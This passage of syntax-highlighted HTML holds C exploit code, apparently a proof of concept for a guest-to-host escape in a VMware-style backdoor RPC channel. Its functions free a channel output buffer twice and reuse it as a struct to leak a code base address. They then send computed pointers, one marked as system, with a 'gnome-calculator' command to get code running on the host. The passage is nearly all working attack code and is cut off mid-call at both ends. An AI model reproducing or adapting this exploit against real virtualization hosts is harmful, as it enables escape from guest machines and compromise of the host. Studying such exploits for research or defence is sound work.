punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Freeing the buffer....,bp:0x5555556DD3EF\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Trying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.b"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> pay1 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95B8</span><span class="token punctuation">;</span>     <span class="token class-name">uint64_t</span> pay2 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xECFD0</span><span class="token punctuation">;</span> <span class="token comment">//system</span>    <span class="token class-name">uint64_t</span> pay3 <span class="token operator">=</span>text<span class="token operator">+</span><span class="token number">0xFE95C8</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>pay4 <span class="token operator">=</span> <span class="token string">"gnome-calculator\x00"</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leak2 success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_recv_finish2</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay1<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>pay2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">3</span><span 